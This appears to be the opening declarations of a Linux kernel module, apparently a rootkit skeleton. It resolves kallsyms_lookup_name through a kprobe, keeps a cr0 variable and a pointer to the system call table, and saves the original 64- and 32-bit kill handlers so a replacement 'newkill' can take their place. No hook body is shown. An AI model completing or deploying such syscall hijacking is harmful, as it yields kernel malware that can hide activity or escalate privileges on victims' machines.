

#include <linux/linkage.h>
#include <linux/dirent.h>
#include <linux/kprobes.h>

unsigned long cr0;

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

typedef asmlinkage int (*sys_kill_t)(pid_t, int);
typedef unsigned char int8;
typedef unsigned short int int16;
typedef unsigned int int32;
typedef unsigned long int64;

static unsigned long *sys_call_table;
sys_kill_t original_kill_64;
sys_kill_t original_kill_32;
asmlinkage int newkill(pid_t, int);
unsigned long *find_syscall_table(void);
